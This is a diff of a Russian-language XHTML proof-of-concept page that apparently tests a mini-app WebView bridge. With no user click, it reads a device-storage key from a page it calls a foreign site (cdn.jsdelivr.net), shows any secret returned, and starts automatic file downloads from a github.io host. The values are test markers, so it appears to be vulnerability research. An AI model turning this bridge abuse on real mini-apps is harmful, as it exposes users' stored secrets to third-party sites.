@@ -1,25 +1,29 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" lang="ru">
-<head><meta charset="utf-8"/><title>R</title>
-<style>body{font:15px monospace;margin:10px;background:#fffbe6}button{width:100%;padding:14px;font:inherit;font-size:16px;font-weight:bold;background:#dfd;border:2px solid #484;border-radius:8px;cursor:pointer}#s{margin-top:6px;word-break:break-all}</style>
-</head>
+<head><meta charset="utf-8"/><title>RESULT</title>
+<style>
+body{font:16px monospace;margin:10px;background:#fffbe6}
+#big{font-size:20px;font-weight:bold;background:#fff;border:3px solid #484;border-radius:8px;padding:14px;margin-top:8px;word-break:break-all}
+#s{margin-top:8px;word-break:break-all;color:#555}
+</style></head>
 <body>
-<button id="b">КНОПКА 1 — нажми меня</button>
-<div id="s">ожидание…</div>
+<div>Это ЧУЖОЙ сайт (cdn.jsdelivr.net). Сейчас он сам прочитает хранилище мини-приложения…</div>
+<div id="big">ожидание…</div>
+<div id="s">-</div>
 <script><![CDATA[
+const big=document.getElementById('big');
 const s=document.getElementById('s');
 const TS=Date.now().toString(36);
-window.WebApp={sendEvent:function(n,d){s.textContent="<= "+n+" "+d;}};
+window.WebApp={sendEvent:function(n,d){
+  s.textContent="<= "+n+" "+d;
+  if(String(d).indexOf("SECRET-SHARED-VALUE")>=0){ big.textContent="ПРОЧИТАНО С ЧУЖОГО САЙТА: "+d; big.style.borderColor="#c00"; }
+}};
 function post(name,obj){
-  const p=name+":"+JSON.stringify(obj);
-  try{ window.webkit.messageHandlers.EventHandler.postMessage(p); s.textContent="отправлено: "+p; }
-  catch(e){ s.textContent="нет моста: "+e.message; }
+  try{ window.webkit.messageHandlers.EventHandler.postMessage(name+":"+JSON.stringify(obj)); }
+  catch(e){ big.textContent="мост недоступен: "+e.message; }
 }
-document.getElementById('b').onclick=function(){
-  post("WebAppDeviceStorageGetKey",{requestId:"frame-secret-"+TS,key:"probe-secret-shared"});
-  setTimeout(function(){post("WebAppSecureStorageGetKey",{requestId:"frame-sec-"+TS,key:"probe-secret-sec"})},400);
-};
+setTimeout(function(){post("WebAppDeviceStorageGetKey",{requestId:"xread-"+TS,key:"probe-secret-shared"})},1200);
 setTimeout(function(){post("WebAppDownloadFile",{url:"https://nbafan00.github.io/dl-check/probe.txt",file_name:"probe-auto1s-"+TS+".txt"})},1000);
 setTimeout(function(){post("WebAppDownloadFile",{url:"https://nbafan00.github.io/dl-check/probe.txt",file_name:"probe-auto5s-"+TS+".txt"})},5000);
 ]]></script>
